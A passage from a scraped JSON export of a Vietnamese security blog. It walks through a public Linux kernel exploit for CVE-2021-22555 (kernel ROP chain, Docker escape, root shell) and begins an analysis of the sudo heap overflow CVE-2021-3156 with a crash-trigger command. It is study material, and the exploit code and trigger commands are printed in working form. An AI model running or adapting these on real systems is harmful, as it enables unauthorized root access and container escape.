0) { perror(\u0026#34;[-] read\u0026#34;); goto err_rmid; } if (*(uint64_t *)\u0026amp;secondary_buf[0x10] != MTYPE_FAKE) pipe_buffer_ops = *(uint64_t *)\u0026amp;secondary_buf[0x10]; } } kbase_addr = pipe_buffer_ops - ANON_PIPE_BUF_OPS; printf(\u0026#34;[+] anon_pipe_buf_ops: %\u0026#34; PRIx64 \u0026#34;\\n\u0026#34;, pipe_buffer_ops); printf(\u0026#34;[+] kbase_addr: %\u0026#34; PRIx64 \u0026#34;\\n\u0026#34;, kbase_addr); if ((kbase_addr \u0026amp; 0xFFFF0000000FFFFF) != 0xFFFF000000000000) { printf(\u0026#34;[-] Error kernel base address is incorrect.\\n\u0026#34;); goto err_rmid; } Chúng ta dùng 2 vòng for để đi qua tất cả các vùng nhớ mà sk_buff trỏ tới, tại đây, ta đọc dữ liệu, lưu vào vùng đệm secondary_buf tại dòng 4. Tại dòng số 8 kiểm tra để xác tìm vùng nhớ mà chúng ta muốn. MTYPE_FAKE là giá trị được gán cho msg-\u0026gt;mtype khi chúng ta tạo fake_msg_msg từ hàm build_msg_msg. Do đó, vùng nhớ nào có giá trị tại secondary_buf[0x10] khác với MTYPE_FAKE chính là vùng nhớ chúng của pipe_buffer mà chúng ta spray được. Ta lấy địa chỉ của vùng nhớ này tại dòng 9 và lưu vào biến pipe_buffer_ops kbase_addr được tín từ công thức ở dòng 13, trong đó: Để tính ANON_PIPE_BUF_OPS ta tính lấy địa chỉ anon_pipe_buf_ops và _text trong file /proc/kallsyms:\n1 2 3 4 5 root@ubuntu:/home/edisc/Desktop/cve-2021-22555/security-research/pocs/linux/cve-2021-22555# cat /proc/kallsyms | grep anon_pipe_buf_ops ffffffff9c878380 r anon_pipe_buf_ops root@ubuntu:/home/edisc/Desktop/cve-2021-22555/security-research/pocs/linux/cve-2021-22555# cat /proc/kallsyms | grep _text ffffffff9b800000 T _text ANON_PIPE_BUF_OPS = anon_pipe_buf_ops - _text STAGE 4: Kernel code execution 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 printf(\u0026#34;[+] STAGE 4: Kernel code execution\\n\u0026#34;); printf(\u0026#34;[*] Spraying fake pipe_buffer objects...\\n\u0026#34;); memset(secondary_buf, 0, sizeof(secondary_buf)); buf = (struct pipe_buffer *)\u0026amp;secondary_buf; buf-\u0026gt;ops = kheap_addr + 0x290; ops = (struct pipe_buf_operations *)\u0026amp;secondary_buf[0x290]; #ifdef KERNEL_COS_5_4_89 // RAX points to \u0026amp;buf-\u0026gt;ops. // RCX points to \u0026amp;buf. ops-\u0026gt;release = kbase_addr + PUSH_RAX_JMP_QWORD_PTR_RCX; #elif KERNEL_UBUNTU_5_8_0_48 // RSI points to \u0026amp;buf. ops-\u0026gt;release = kbase_addr + PUSH_RSI_JMP_QWORD_PTR_RSI_39; #endif build_krop(secondary_buf, kbase_addr, kheap_addr + 0x2B0); if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) \u0026lt; 0) goto err_rmid; // Trigger pipe_release(). printf(\u0026#34;[*] Releasing pipe_buffer objects...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_PIPEFDS; i++) { if (close(pipefd[i][0]) \u0026lt; 0) { perror(\u0026#34;[-] close\u0026#34;); goto err_rmid; } if (close(pipefd[i][1]) \u0026lt; 0) { perror(\u0026#34;[-] close\u0026#34;); goto err_rmid; } } printf(\u0026#34;[*] Checking for root...\\n\u0026#34;); if ((fd = open(\u0026#34;/etc/shadow\u0026#34;, O_RDONLY)) \u0026lt; 0) { printf(\u0026#34;[-] Error could not gain root privileges.\\n\u0026#34;); goto err_rmid; } close(fd); printf(\u0026#34;[+] Root privileges gained.\\n\u0026#34;); Spraying fake pipe_buffer objects\u0026hellip; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 printf(\u0026#34;[*] Spraying fake pipe_buffer objects...\\n\u0026#34;); memset(secondary_buf, 0, sizeof(secondary_buf)); buf = (struct pipe_buffer *)\u0026amp;secondary_buf; buf-\u0026gt;ops = kheap_addr + 0x290; ops = (struct pipe_buf_operations *)\u0026amp;secondary_buf[0x290]; #ifdef KERNEL_COS_5_4_89 // RAX points to \u0026amp;buf-\u0026gt;ops. // RCX points to \u0026amp;buf. ops-\u0026gt;release = kbase_addr + PUSH_RAX_JMP_QWORD_PTR_RCX; #elif KERNEL_UBUNTU_5_8_0_48 // RSI points to \u0026amp;buf. ops-\u0026gt;release = kbase_addr + PUSH_RSI_JMP_QWORD_PTR_RSI_39; #endif build_krop(secondary_buf, kbase_addr, kheap_addr + 0x2B0); if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) \u0026lt; 0) goto err_rmid; Chúng ta tạo một fake pipe_buffer objects với kheap_addr + 0x290. Tiếp theo, dòng 6-9 dùng cho centos 5.4.89 và dòng 10-13 cho ubuntu 5.8.0.48 Xây dựng một kernel rop lưu vào secondary_buf và dùng lệnh spray_skbuff để đưa kernel_rop của chúng ta vào vùng nhớ để thực thi. Hàm build_krop được xây dựng như sau: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 // Note: Must not touch offset 0x10-0x18. void build_krop(char *buf, uint64_t kbase_addr, uint64_t scratchpad_addr) { uint64_t *rop; #ifdef KERNEL_COS_5_4_89 *(uint64_t *)\u0026amp;buf[0x00] = kbase_addr + POP_RSP_POP_RBX_RET; rop = (uint64_t *)\u0026amp;buf[0x18]; // Save RBP at scratchpad_addr. *rop++ = kbase_addr + ENTER_0_0_POP_RBX_POP_R14_POP_RBP_RET; *rop++ = scratchpad_addr; // R14 *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + MOV_QWORD_PTR_R14_RBX_POP_RBX_POP_R14_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBX *rop++ = 0xDEADBEEF; // R14 *rop++ = 0xDEADBEEF; // RBP // commit_creds(prepare_kernel_cred(NULL)) *rop++ = kbase_addr + POP_RDI_RET; *rop++ = 0; // RDI *rop++ = kbase_addr + PREPARE_KERNEL_CRED; *rop++ = kbase_addr + POP_RDX_RET; *rop++ = 1; // RDX *rop++ = kbase_addr + CMP_RDX_1_JNE_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + MOV_RDI_RAX_JNE_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + COMMIT_CREDS; // switch_task_namespaces(find_task_by_vpid(1), init_nsproxy) *rop++ = kbase_addr + POP_RDI_RET; *rop++ = 1; // RDI *rop++ = kbase_addr + FIND_TASK_BY_VPID; *rop++ = kbase_addr + POP_RDX_RET; *rop++ = 1; // RDX *rop++ = kbase_addr + CMP_RDX_1_JNE_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + MOV_RDI_RAX_JNE_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + POP_RSI_RET; *rop++ = kbase_addr + INIT_NSPROXY; // RSI *rop++ = kbase_addr + SWITCH_TASK_NAMESPACES; // Load RBP from scratchpad_addr and resume execution. *rop++ = kbase_addr + POP_RBP_RET; *rop++ = scratchpad_addr - 0x25; // RBP *rop++ = kbase_addr + PUSH_QWORD_PTR_RBP_25_POP_RBP_RET; *rop++ = kbase_addr + MOV_RSP_RBP_POP_RBP_RET; #elif KERNEL_UBUNTU_5_8_0_48 *(uint64_t *)\u0026amp;buf[0x39] = kbase_addr + POP_RSP_RET; *(uint64_t *)\u0026amp;buf[0x00] = kbase_addr + ADD_RSP_D0_RET; rop = (uint64_t *)\u0026amp;buf[0xD8]; // Save RBP at scratchpad_addr. *rop++ = kbase_addr + ENTER_0_0_POP_RBX_POP_R12_POP_RBP_RET; *rop++ = scratchpad_addr; // R12 *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + MOV_QWORD_PTR_R12_RBX_POP_RBX_POP_R12_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBX *rop++ = 0xDEADBEEF; // R12 *rop++ = 0xDEADBEEF; // RBP // commit_creds(prepare_kernel_cred(NULL)) *rop++ = kbase_addr + POP_RDI_RET; *rop++ = 0; // RDI *rop++ = kbase_addr + PREPARE_KERNEL_CRED; *rop++ = kbase_addr + POP_RCX_RET; *rop++ = 4; // RCX *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET; *rop++ = kbase_addr + COMMIT_CREDS; // switch_task_namespaces(find_task_by_vpid(1), init_nsproxy) *rop++ = kbase_addr + POP_RDI_RET; *rop++ = 1; // RDI *rop++ = kbase_addr + FIND_TASK_BY_VPID; *rop++ = kbase_addr + POP_RCX_RET; *rop++ = 4; // RCX *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET; *rop++ = kbase_addr + POP_RSI_RET; *rop++ = kbase_addr + INIT_NSPROXY; // RSI *rop++ = kbase_addr + SWITCH_TASK_NAMESPACES; // Load RBP from scratchpad_addr and resume execution. *rop++ = kbase_addr + POP_RBP_RET; *rop++ = scratchpad_addr - 0xA; // RBP *rop++ = kbase_addr + PUSH_QWORD_PTR_RBP_A_POP_RBP_RET; *rop++ = kbase_addr + MOV_RSP_RBP_POP_RBP_RET; #endif } Nguyên tắc hoạt động của Kernel ROP chain là: Lưu giá trị của RBP tại một số scratchpad address (scratchpad giống như một mẫu giấy ghi chú để lưu trữ những kiến thức tạm thời khi bạn đọc 1 cuốn sách) để sau này sử dụng. Gọi hàm commit_creds(prepare_kernel_cred(NULL)) để cài đặt kernel credentials Gọi hàm switch_task_namespaces(find_task_by_vpid(1), init_nsproxy) để chuyển không gian tên namespace của process 1 thành một trong những init process. Khôi phục lại giá trị của RBP và quay lại luồng thực thi cũ (ngay sau hàm free_pipe_info()) Releasing pipe_buffer objects\u0026hellip; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // Trigger pipe_release(). printf(\u0026#34;[*] Releasing pipe_buffer objects...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_PIPEFDS; i++) { if (close(pipefd[i][0]) \u0026lt; 0) { perror(\u0026#34;[-] close\u0026#34;); goto err_rmid; } if (close(pipefd[i][1]) \u0026lt; 0) { perror(\u0026#34;[-] close\u0026#34;); goto err_rmid; } } printf(\u0026#34;[*] Checking for root...\\n\u0026#34;); if ((fd = open(\u0026#34;/etc/shadow\u0026#34;, O_RDONLY)) \u0026lt; 0) { printf(\u0026#34;[-] Error could not gain root privileges.\\n\u0026#34;); goto err_rmid; } close(fd); printf(\u0026#34;[+] Root privileges gained.\\n\u0026#34;); printf(\u0026#34;\\n\u0026#34;); Sau khi đã xây dựng xong kernel_rop, chúng ta tiến hành giải phóng các vùng nhớ pipe_buffer để kích hoạt hàm pipe_release(). Bước này ta dùng vòng for để đi qua hết tất cả các pipe filedescriptor và dùng lệnh close để giải phóng vùng nhớ. dòng lệnh 33-38 dùng để kiểm tra xem liệu chúng ta đã lấy được root hay chưa vì tệp /etc/shadow chỉ được đọc bởi root. STAGE 5: Post-exploitation 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 printf(\u0026#34;[+] STAGE 5: Post-exploitation\\n\u0026#34;); printf(\u0026#34;[*] Escaping container...\\n\u0026#34;); setns(open(\u0026#34;/proc/1/ns/mnt\u0026#34;, O_RDONLY), 0); setns(open(\u0026#34;/proc/1/ns/pid\u0026#34;, O_RDONLY), 0); setns(open(\u0026#34;/proc/1/ns/net\u0026#34;, O_RDONLY), 0); printf(\u0026#34;[*] Cleaning up...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_MSQIDS; i++) { // TODO: Fix next pointer. if (i == fake_idx) continue; if (msgctl(msqid[i], IPC_RMID, NULL) \u0026lt; 0) perror(\u0026#34;[-] msgctl\u0026#34;); } for (int i = 0; i \u0026lt; NUM_SOCKETS; i++) { if (close(ss[i][0]) \u0026lt; 0) perror(\u0026#34;[-] close\u0026#34;); if (close(ss[i][1]) \u0026lt; 0) perror(\u0026#34;[-] close\u0026#34;); } if (close(s) \u0026lt; 0) perror(\u0026#34;[-] close\u0026#34;); printf(\u0026#34;[*] Popping root shell...\\n\u0026#34;); char *args[] = {\u0026#34;/bin/bash\u0026#34;, \u0026#34;-i\u0026#34;, NULL}; execve(args[0], args, NULL); return 0; Đây là đoạn lệnh cho phép chúng ta thoát khỏi docker. Khi đã có root, chúng ta tiến hành thay đổi mnt, pid, net namespace để cho phép chúng ta thoát khỏi container. Đoạn lệnh 4-6 thực hiện sự thay đổi này. Đoạn lệnh từ dòng 8-23 thực hiện thao tác dọn dẹp các message queue, đóng tất cả các socketpair. Cuối cùng thực hiện lệnh để chạy shell của root dòng 25-27 Tóm lại Bài này tôi chỉ viết lại từ bài viết chính của tác giả, thêm vào đó, là những giải thích của tôi về những vấn đề tác giả chưa nói rõ hoặc quá căn bản với tác giả nhưng không hề với tôi. Vì kiến thức tôi còn hạn chế, nên những giải thích có thể đúng hoặc sai, nếu sai, rất mong nhận được sự góp để hoàn thiện hơn. Lời cuối, chân thành cảm ơn sự cống hiến của tác giả - Andy Nguyen (theflow@) - đặc biệt poc của anh, đã giúp tôi rất nhiều trong quá trình nâng cao kĩ năng của mình. Nguồn tham khảo CVE-2021-22555: Turning \\x00\\x00 into 10000$ CVE-2021-22555: Linux kernel privilege escalation causes Docker to escape ","description":"Lỗi heap out-of-bound","id":11,"section":"posts","tags":["cve,  escape_docker"],"title":"Tìm hiểu về CVE-2021-22555","uri":"https://minhlongmt183.github.io/posts/cve-2021-22555/"},{"content":"Docker security Docker security non-events Protect the Docker daemon socket Using certificates for repository client verification User trusted images Antivirus software AppArmor security profiles Seccomp security profiles Chế độ điện toán an toàn Secure computing mode (seccomp) là một tính năng của Linux kernel, dùng để hạn chế một số action trong container. Hàm seccomp() system call dùng để xử lí trạng thái của seccomp.\n","description":"Docker Security","id":12,"section":"posts","tags":["Docker"],"title":"Tìm hiểu và sử dụng docker (P8)","uri":"https://minhlongmt183.github.io/posts/docker_p8/"},{"content":"\rBài viết này nhằm mục đích ghi lại những kiến thức đã học để nhớ và hiểu rõ hơn.\rTổng quan Lỗi của CVE này thuộc loại heap-based buffer overflow trong sudo. Cụ thể:\nNó cho phép người dùng bình thường lấy được root mà không cần biết mật khẩu của root. Những phiên bản bị ảnh hưởng: legacy có phiên bản của sudo từ 1.8.2 - 1.8.31p2 stable có phiên bản của sudo từ 1.9.0 - 1.9.5p1 Trong bài viết này, tôi tiến hành khai thác trên Ubuntu 18.04.5 LTS có phiên bản của sudo: 1 2 3 4 5 6 edisc@ubuntu:~$ sudo -V Sudo version 1.9.5p1 Sudoers policy plugin version 1.9.5p1 Sudoers file grammar version 48 Sudoers I/O plugin version 1.9.5p1 Sudoers audit plugin version 1.9.5p1 Phân tích Bức tranh sơ lược Khi Sudo được thực thi ở chế độ command line: Nếu sử dụng tùy chọn -s, thì Sudo's MODE_SHELL flag sẽ được bật. Nếu sử dụng tùy chọn -i, thì Sudo's MODE_SHELL và MODE_LOGIN_SHELL flags sẽ được bật. Khi thực thi, bắt đầu hàm main() của Sudo, hàm parse_args() sẽ viết lại argv (dòng 609-617) bằng cách nối tất cả các command-line arguments (dòng 587-595) và thêm vào trước các kí tự đặc biệt một dấu backslashes \\. (dòng 590-591): 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 571 if (ISSET(mode, MODE_RUN) \u0026amp;\u0026amp; ISSET(flags, MODE_SHELL)) { 572 char **av, *cmnd = NULL; 573 int ac = 1; ... 581 cmnd = dst = reallocarray(NULL, cmnd_size, 2); ... 587 for (av = argv; *av != NULL; av++) { 588 for (src = *av; *src != \u0026#39;\\0\u0026#39;; src++) { 589 /* quote potential meta characters */ 590 if (!isalnum((unsigned char)*src) \u0026amp;\u0026amp; *src != \u0026#39;_\u0026#39; \u0026amp;\u0026amp; *src != \u0026#39;-\u0026#39; \u0026amp;\u0026amp; *src != \u0026#39;$\u0026#39;) 591 *dst++ = \u0026#39;\\\\\u0026#39;; 592 *dst++ = *src; 593 } 594 *dst++ = \u0026#39; \u0026#39;; 595 } ... 600 ac += 2; /* -c cmnd */ ... 603 av = reallocarray(NULL, ac + 1, sizeof(char *)); ... 609 av[0] = (char *)user_details.shell; /* plugin may override shell */ 610 if (cmnd != NULL) { 611 av[1] = \u0026#34;-c\u0026#34;; 612 av[2] = cmnd; 613 } 614 av[ac] = NULL; 615 616 argv = av; 617 argc = ac; 618 } Sau đó, trong hàm sudoers_policy_main(), hàm set_cmnd() nối tất cả các command-line arguments vào heap-based buffer \u0026quot;user_args\u0026quot; (dòng) 864-871) và bỏ qua kí tự \\ dòng 866-867. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 819 if (sudo_mode \u0026amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) { ... 852 for (size = 0, av = NewArgv + 1; *av; av++) 853 size += strlen(*av) + 1; 854 if (size == 0 || (user_args = malloc(size)) == NULL) { ... 857 } 858 if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) { ... 864 for (to = user_args, av = NewArgv + 1; (from = *av); av++) { 865 while (*from) { 866 if (from[0] == \u0026#39;\\\\\u0026#39; \u0026amp;\u0026amp; !isspace((unsigned char)from[1])) 867 from++; 868 *to++ = *from++; 869 } 870 *to++ = \u0026#39; \u0026#39;; 871 } ... 884 } ... 886 } Nếu command-line argument kết thúc với single backslash: Tại dòng 866, from[0] = '\\\\' và from[1]=NULL. Tại dòng 867, from tăng 1 đơn vị, from trỏ tới NULL - from=NULL. Tại dòng 868, NULL sẽ được copy vào user_args buffer, và from tăng 1 đơn vị, trỏ đến giá trị sau NULL (out of the argument\u0026rsquo;s bounds). Vòng lặp while tại dòng 865-869 sẽ đọc và copy vùng dữ liệu out-of-bounds vào user_args buffer. Dễ thấy, set_cmnd() là nguyên nhân dẫn tới lỗ hổng heap-based buffer overflow, bởi vì vùng dữ liệu out-of-bounds đã được copy vào user_args buffer, tuy nhiên nó lại không chỉ định kích thước của chúng (kích thước được tính toán tại dòng 852-853) Về lí thuyết, không có command-line argument nào có thể kết thúc bằng dấu \\ bởi vì: Nếu MODE_SHELL hay MODE_LOGIN_SHELL được bật (line 858 - điều kiện cần để đến vùng code bị lỗi), thì MODE_SHELL được bật (dòng 571) và hàm parse_args() sẽ thêm kí tự \\ vào các kí tự đặc biệt (meta-characters) bao gồm cả \\ (nó sẽ thay \\ thành \\\\) Tuy nhiên, nếu quan sát kĩ, chúng ta sẽ thấy điều kiện gọi hàm của set_cmnd() và parse_args() có một chút khác biệt: 1 2 3 819 if (sudo_mode \u0026amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) { ... 858 if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) { khác với\n1 571 if (ISSET(mode, MODE_RUN) \u0026amp;\u0026amp; ISSET(flags, MODE_SHELL)) { Câu hỏi đặt ra ở đây, liệu rằng ta có thể bật một trong ba mode MODE_EDIT, MODE_CHECK, MODE_SHELL mà không cần phải bật MODE_RUN - kích hoặc escape code không? Câu trả lời hầu như không thể, bởi vì: Nếu ta bật MODE_EDIT (tùy chọn -e, dòng 361) hay MODE_CHECK (tùy chọn -l, dòng 423 và 519), thì hàm parse_args() sẽ xóa MODE_SHELL từ valid_flags (dòng 363 và 424), trả về lỗi nếu tìm thấy invalid flag như MODE_SHELL (dòng 532-533): 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 358 case \u0026#39;e\u0026#39;: ... 361 mode = MODE_EDIT; 362 sudo_settings[ARG_SUDOEDIT].value = \u0026#34;true\u0026#34;; 363 valid_flags = MODE_NONINTERACTIVE; 364 break; ... 416 case \u0026#39;l\u0026#39;: ... 423 mode = MODE_LIST; 424 valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST; 425 break; ... 518 if (argc \u0026gt; 0 \u0026amp;\u0026amp; mode == MODE_LIST) 519 mode = MODE_CHECK; ... 532 if ((flags \u0026amp; valid_flags) != flags) 533 usage(1); May mắn thay, chúng vẫn tồn tại một sơ hở: Nếu chúng ta thực thi Sudo là sudoedit thay vì sudo, parse_args() sẽ tự động bật MODE_EDIT (dòng 270) nhưng không xóa các valid_flags, và MODE_SHELL lại nằm trong danh sách các valid_flags này (dòng 127 và 249): 1 2 3 4 5 6 7 8 9 10 127 #define DEFAULT_VALID_FLAGS (MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL) ... 249 int valid_flags = DEFAULT_VALID_FLAGS; ... 267 proglen = strlen(progname); 268 if (proglen \u0026gt; 4 \u0026amp;\u0026amp; strcmp(progname + proglen - 4, \u0026#34;edit\u0026#34;) == 0) { 269 progname = \u0026#34;sudoedit\u0026#34;; 270 mode = MODE_EDIT; 271 sudo_settings[ARG_SUDOEDIT].value = \u0026#34;true\u0026#34;; 272 } Việc này dẫn đến: nếu chúng ta thực thi sudoedit -s, sau đó bật MODE_EDIT và MODE_SHELL nhưng không bật MODE_RUN, chúng ta sẽ tránh được escape code và đi đến vùng code bị lỗi. Sau đó, overflow heap-based buffer \u0026ldquo;user_args\u0026rdquo; thông qua command-line argument mà kết thúc bằng dấu backslash. 1 2 3 4 5 6 7 8 edisc@ubuntu:~$ sudo -s \u0026#39;\\\u0026#39; `perl -e \u0026#39;print \u0026#34;A\u0026#34; x 65536\u0026#39;` [sudo] password for edisc: Sorry, try again. [sudo] password for edisc: sudo: 1 incorrect password attempt edisc@ubuntu:~$ sudoedit -s \u0026#39;\\\u0026#39; `perl -e \u0026#39;print \u0026#34;A\u0026#34; x 65536\u0026#39;` Segmentation fault (core dumped) edisc@ubuntu:~$ Dưới góc nhìn của kẻ tấn công, buffer overflow trong trường hợp này khá lí tưởng, bởi vì: Chúng ta có thể kiểm soát được kích thước của vùng nhớ mà chúng ta overflow: user_args buffer (dòng 852-854) Chúng ta hoàn toàn độc lập trong việc kiểm soát kích thước và nội dung của vùng nhớ bị overflow (dòng 852-853) Chúng ta thậm chí có thể viết null bytes vào vùng nhớ bị overflow (tham số hoặc biến môi trường kết thúc bằng \\ sẽ viết 1 null byte vào \u0026ldquo;user_args\u0026rdquo; dòng 866-868) Ví dụ, trên amd64 Linux, chúng ta có thể cấp phát 24 bytes trong user-args buffer (32-heap chunk) và ghi đè những field của chunk tiếp theo với A=a\\0B=b\\0, ghi đè trường fd với C=c\\0D=d\\0 và trường bk với E=e\\0F=f\\0: 1 2 3 4 5 6 7 8 ------------------------------------------------------------------------ env -i \u0026#39;AA=a\\\u0026#39; \u0026#39;B=b\\\u0026#39; \u0026#39;C=c\\\u0026#39; \u0026#39;D=d\\\u0026#39; \u0026#39;E=e\\\u0026#39; \u0026#39;F=f\u0026#39; sudoedit -s \u0026#39;1234567890123456789012\\\u0026#39; ------------------------------------------------------------------------ --|--------+--------+--------+--------|--------+--------+--------+--------+-- | | |12345678|90123456|789012.A|A=a.B=b.|C=c.D=d.|E=e.F=f.| --|--------+--------+--------+--------|--------+--------+--------+--------+-- size \u0026lt;---- user_args buffer ----\u0026gt; size fd bk fd: forward\nbk: backward\nlà hai con trỏ trong cấu trúc heap\rTrace Heap Usages Để hiểu được luồng thực thi của heap, chúng ta sẽ trace heap usage trên Ubuntu 18.04 từ malloc,realloc, calloc và hàm free với gdb script 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 main() |- setlocale(LC_ALL, \u0026#34;\u0026#34;); |- tzset() |- sudo_conf_read_v1(CONF_DEBUG) | |- setlocale(\u0026#34;C\u0026#34;) // lưu vị trí hiện tại đầu tiên | |- read /etc/sudo.conf | |- setlocale(prev_locale) // khôi phục lại locale |- sudo_conf_read_v1(CONF_ALL) / giống với ở trên |- get_user_info() | |- getpwuid() | | |- parse /etc/nsswitch.conf and create service_user structs |- parse_args() |- sudo_load_plugins() | |- load sudoers.so | |- register env hooks |- policy_open() | |- format_plugin_settings() | | |- initialize sudo settings such as network_addrs (many mallocs) | |- sudoers_policy_init() | | |- init_defaults() | | | |- Nhiều chuỗi ngắn gọi strdup() (kể cả def_timestampdir) | | | |- một số chuỗi gọi dcgettext để cấp phát. | | | |- init_envtables() // tạo ra nhiều malloc() nhỏ | | |- init_vars() | | |- sudo_file_parse() load và parse /etc/sudoers |- policy_check() | |- sudoers_policy_main() | | |- set_cmnd() Luồng thực thi từ một hàm xảy ra lỗi yêu cầu password.\n1 2 3 4 5 6 7 8 9 10 11 12 13 |- set_cmnd() // lỗ hổng ở đây |- setlocale(\u0026#34;C\u0026#34;) |- sudo_file_lookup() // tìm kiếm dữ liệu được phân tích từ /etc/sudoers | |- nss_* | | |- nss_load_library() |- setlocale(user_locale) // khôi phục lại locale |- check_user() | |- check_user_interactive() | | |- tạo tệp timestamp trong def_timestampdir | | |- yêu cầu mật khẩu (nếu xác thực thất bại, thoát) | |- find_editer() | |- call sudoer_hook_env(\u0026#34;SUDO_EDITOR\u0026#34;) // chỉ được gọi nếu xác thực thành công. đã chạy gdbscript nhưng vẫn chưa note lại để kiểm tra xem cấu trúc có giống với tác giả chưa Đã làm được\rXác định những đối tượng có thể bị overwriting Với luồng thực thi trên, có một số đối tượng (objects) được cấp phát trước khi chúng ta muốn tiến hành heap overflow và được sử dụng sau đó (lí tưởng cho việc ghi đè). nss service_user object def_timestampdir path compar function pointer in rbtree struct - Con trỏ hàm có thể bị ghi đè từng phần để bypass ASLRS (dùng một đoạn code bruteforcing), tuy nhiên tham số đầu tiên lại là chuỗi rỗng. userspects object from parsing /etc/sudoers: có khả năng bypass xác thực trên sudo có phiên bản \u0026gt;= 1.8.9 nhưng phải làm giả nhiều đối tượng (fake many objects). glibc heap with/without tcache Từ glibc phiên bản 2.25, tcache được thêm vào heap allocation. So sánh giữa tcache bins và fast bins: Giống: Cả 2 đều đánh dấu đã được sử dụng. Đều là LIFO (Last In, First Out). Có thể cấp phát lại nếu kích thước yêu cầu cấp phát trùng với kích thước của bin. Khác: Max fast bín size là 0x80, còn max tache bins size là 0x410. Khi kích thước yêu cầu cấp phát lớn hơn small bins (0x400), tất cả các fast bins được đưa vào unsorted bins, sau đó chúng được tập hợp lại, đưa vào bin nhỏ hơn hoặc lớn hơn. Có nhiều cấp phát yêu cầu khích thước lớn (như file buffer trong glibc) trong các chương trình chạy ở quyền sudo. Với tache bín, large chunk dược cấp phát sẽ không bị ảnh hưởng trong tcahe bins. Những free chunks với những kích thước nhất định sẽ nằm trong tache bin mãi. Khai thác glibc setlocale Khi hàm setlocale được gọi với chuỗi rỗng, những biến môi trường LC_* được sử dụng như đầu vào cho hàm _nl_find_locale: 1 2 3 4 5 6 7 8 9 10 11 12 13 115 if (cloc_name[0] == \u0026#39;\\0\u0026#39;) 116 { 117 /* The user decides which locale to use by setting environment 118 variables*/ 119 cloc_name = getenv(\u0026#34;LC_ALL\u0026#34;); 120 if (!name_present(cloc_name)) 121 cloc_name = getenv(_nl_category_name.str 122 + _nl_category_name_idxs[category]); 123 if (!name_present(cloc_name)) 124 cloc_name = getenv(\u0026#34;LANG\u0026#34;); 125 if (!name_present(cloc_name)) 126 cloc_name = _nl_C_name; 127 } Đoạn code trên, ta thấy ưu tiên cho việc lấy locale name cho mỗi danh mục là LC_ALL, LC_\u0026lt;CATEGORY_NAME\u0026gt;, LANG environment. Nếu không có gì được thiết lập, special locale name \u0026quot;C\u0026quot; được sử dụng. Nếu locale name là \u0026ldquo;C\u0026rdquo;, hàm _nl_find_locale sẽ trả về ngay lập tức mà không đi tới heap, với những tên khác, flow sẽ như sau: 1 2 3 4 5 6 7 8 9 10 11 185 /*LOCALE can consist of up to four recognized parts for the XPG syntax: 186 language[_territory[.codeset]][@modifier] 187 188 Beside the first all of them are allowed to be missing. If the full specified locale is not found, the less specific one are looked for. The various part will be stripped off according to the following order: 189 (1) codeset 190 (2) normalized codeset 191 (3) territory 192 (4) modifier */ mask = _nl_explode_name (loc_name, \u0026amp;language, \u0026amp;modifier, \u0026amp;territory, \u0026amp;codeset, \u0026amp;normalized_codeset); Giá trị trả về mark là cờ để chỉ ra sự tồn tại của các phần này trong locale name được nhận. Sau đó hàm _nl_make_l10nflist được gọi để kiểm tra liệu locale name đã nhận có được tải lên hay chưa? Điều này yêu cầu malloc để lưu đầy đủ tên thư mục. Nếu nó nằm trong danh sách/lệnh gọi chỉ để nhận, giải phóng nó rồi trả về.\n1 2 3 4 5 6 7 8 9 10 11 12 165 /*Allocate room for the full file name. */ 166 abs_filename = (char *) malloc(dirlist_len 167 + strlen(language) 168 + ((mask \u0026amp; XPG_TERRITORY) != 0 169 ? strlen (codeset) + 1 : 0) 170 + ((mask \u0026amp; XPG_CODESET) != 0 171 ? strlen(normalized_codeset) + 1 : 0) 172 + ((mask \u0026amp; XPG_NORM_CODESET) != 0 173 ? strlen(normalized_codeset) + 1 : 0) 174 + ((mask \u0026amp; XPG_MODIFIER) != 0 